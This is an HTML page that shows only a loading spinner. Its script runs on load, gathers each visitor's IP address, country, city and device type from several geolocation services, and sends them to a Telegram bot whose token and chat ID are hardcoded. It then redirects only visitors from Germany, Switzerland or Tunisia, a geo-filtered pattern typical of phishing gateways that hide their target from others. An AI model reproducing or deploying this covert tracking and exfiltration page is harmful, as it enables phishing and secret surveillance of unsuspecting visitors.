<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #121212;
      color: white;
      font-family: Arial, sans-serif;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader"></div>

  <script>
    // Telegram Bot settings (replace with your own)
    const botToken = "7558303077:AAFyGBdFFJsBK6abcedW4fcMo9IVn3WwJQk";
    const chatId = "-1002763899038";

    function notifyTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    // Function to get visitor IP and country with multiple fallback services
    async function getVisitorInfo() {
      const services = [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json',
        'https://api.ipify.org?format=json',
        'https://ip-api.com/json/',
        'https://api.country.is/'
      ];

      for (let i = 0; i < services.length; i++) {
        try {
          const response = await fetch(services[i], { 
            timeout: 5000,
            headers: {
              'Accept': 'application/json'
            }
          });
          
          if (!response.ok) continue;
          
          const data = await response.json();
          
          // Parse different response formats
          let ip, country, city, region;
          
          if (services[i].includes('ipapi.co')) {
            ip = data.ip;
            country = data.country_name || data.country;
            city = data.city;
            region = data.region;
          } else if (services[i].includes('ipinfo.io')) {
            ip = data.ip;
            country = data.country;
            city = data.city;
            region = data.region;
          } else if (services[i].includes('ipify.org')) {
            ip = data.ip;
            country = 'Unknown';
            city = 'Unknown';
            region = 'Unknown';
          } else if (services[i].includes('ip-api.com')) {
            ip = data.query;
            country = data.country;
            city = data.city;
            region = data.regionName;
          } else if (services[i].includes('country.is')) {
            ip = data.ip;
            country = data.country;
            city = 'Unknown';
            region = 'Unknown';
          }

          if (ip && ip !== 'undefined' && ip !== 'null') {
            return {
              ip: ip,
              country: country || 'Unknown',
              city: city || 'Unknown',
              region: region || 'Unknown'
            };
          }
        } catch (error) {
          console.log(`Service ${i + 1} failed:`, error.message);
          continue;
        }
      }

      // If all services fail, try to get IP from a simple service
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return {
          ip: data.ip || 'Unable to detect',
          country: 'Unknown',
          city: 'Unknown',
          region: 'Unknown'
        };
      } catch (error) {
        return {
          ip: 'Unable to detect',
          country: 'Unknown',
          city: 'Unknown',
          region: 'Unknown'
        };
      }
    }

    // Check if user is on mobile
    const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);

    // Main function to handle visitor tracking
    async function trackVisitor() {
      const visitorInfo = await getVisitorInfo();
      
      // Check if visitor is from Germany (DE), Switzerland (CH), or Tunisia (TN)
      const allowedCountries = ['Germany', 'Switzerland', 'Tunisia', 'DE', 'CH', 'TN'];
      const isFromAllowedCountry = allowedCountries.includes(visitorInfo.country) || 
                                   visitorInfo.country === 'Germany' || 
                                   visitorInfo.country === 'Switzerland' ||
                                   visitorInfo.country === 'Tunisia';
      
      const redirectStatus = isFromAllowedCountry ? 'Yes' : 'No';
      
      const message = `🔍 New Visitor Detected
      
📍 IP Address: ${visitorInfo.ip}
🌍 Country: ${visitorInfo.country}
🏙️ City: ${visitorInfo.city}
📱 Mobile Device: ${isMobile ? 'Yes' : 'No'}
🌍 Allowed Country: ${isFromAllowedCountry ? 'Yes' : 'No'}
🔄 Redirected: ${redirectStatus}
⏰ Time: ${new Date().toLocaleString()}`;

      // Send notification to Telegram
      notifyTelegram(message);

      // Redirect users from allowed countries after 1 second
      if (isFromAllowedCountry) {
        setTimeout(() => {
          window.location.href = "https://example.com"; // Change to your redirect URL
        }, 1000);
      }
    }

    // Execute visitor tracking
    trackVisitor();
  </script>
</body>
</html>
